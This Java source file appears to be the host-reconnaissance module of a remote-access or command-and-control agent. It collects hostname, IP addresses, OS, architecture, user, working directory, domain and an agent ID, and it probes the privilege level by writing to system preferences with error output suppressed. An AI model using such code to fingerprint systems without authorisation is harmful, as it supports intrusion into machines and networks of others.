package agent;

import java.util.Enumeration;
import java.util.Hashtable;
import java.util.prefs.Preferences;
import java.io.PrintStream;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.security.NoSuchAlgorithmException;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.util.ArrayList;
import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;


public class metadata {

	public static String getHostname() throws UnknownHostException {
	        String deviceName = new String();
                try {
                        InetAddress ipAddress = InetAddress.getLocalHost();
                        deviceName = ipAddress.getHostName();
                } catch (Exception e) {
                        String envVar = new String();
                        try {
                                if (System.getProperty("os.name").contains("Win")) {
                                        deviceName = System.getenv("COMPUTERNAME");
                                } else {
                                        StringBuilder fileString = new StringBuilder();
                                        BufferedReader fileReader = new BufferedReader(new FileReader("/proc/sys/kernel/hostname"));
                                        String nextLine = fileReader.readLine();
                                        while (nextLine != null) {
                                                fileString.append(nextLine);
                                                nextLine = fileReader.readLine();
                                        }
                                        deviceName = fileString.toString();
                                }
                        } catch (Exception f) {
                                deviceName = "na";
                        }
                }
                return deviceName;
	}
	
	public static Hashtable getAddress() throws SocketException {
		Hashtable interfaceMap = new Hashtable();
	        Enumeration interfaces = NetworkInterface.getNetworkInterfaces();
	        while(interfaces.hasMoreElements()) {
			ArrayList<String> addressList = new ArrayList<String>();
	                NetworkInterface interfaceObject = (NetworkInterface) interfaces.nextElement();
	                Enumeration addresses = interfaceObject.getInetAddresses();
	                while(addresses.hasMoreElements()) {
	                        InetAddress addressObject = (InetAddress) addresses.nextElement();
	                        addressList.add(addressObject.getHostAddress());
	                }
			interfaceMap.put(interfaceObject.getName(),addressList.toString());
	        }
	        return interfaceMap;
	}
	
	public static String getOS() {
		return (System.getProperty("os.name")+"-"+System.getProperty("os.version"));
	}
	
	public static String getArch() {
		return System.getProperty("os.arch");
	}
	
	public static String getIntegrity(String userID) throws NoSuchAlgorithmException {
		String randData = Util.strand(32);
		String prefReg = Util.strand(16);
		if (userID.toUpperCase().contentEquals("SYSTEM") || userID.toUpperCase().contentEquals("ROOT") ) {
			return "high";
		} else {
			Preferences chkPref = Preferences.systemRoot();
			PrintStream sysErr = System.err;
			synchronized (sysErr) {
				System.setErr(null);
				try {
					chkPref.put(prefReg, randData);
					chkPref.remove(prefReg);
					chkPref.flush();
					return "medium";
				} catch (Exception e) {
					return "low";
				} finally {
					System.setErr(sysErr);
				}
			}
		}
	}
	
	public static String getUser() {
		return System.getProperty("user.name");
	}
	
	public static String getCWD() {
		return System.getProperty("user.dir");
	}
	
	public static String getDomain() throws UnknownHostException {
		String canonicalHostname = new String();
		try {
			InetAddress ipAddress = InetAddress.getLocalHost();
			canonicalHostname = ipAddress.getCanonicalHostName();
		} catch (Exception e) {
			canonicalHostname = getHostname().toString();
		}
		return canonicalHostname;
	}
	
	public static Hashtable collectMeta(Hashtable args) throws SocketException, UnknownHostException, NoSuchAlgorithmException {
                Hashtable taskOut = new Hashtable();
		taskOut.put("hostname",getHostname().toString());
		taskOut.put("os",getOS());
		taskOut.put("ip", getAddress().toString());
		taskOut.put("acid", Main.config.get("acid").toString());
		taskOut.put("arch", getArch());
		taskOut.put("integrity", getIntegrity(getUser()));
		taskOut.put("user", getUser());
		taskOut.put("cwd", getCWD());
		taskOut.put("domain",getDomain());
		taskOut.put("output","none for now");
                return taskOut;

	}
}
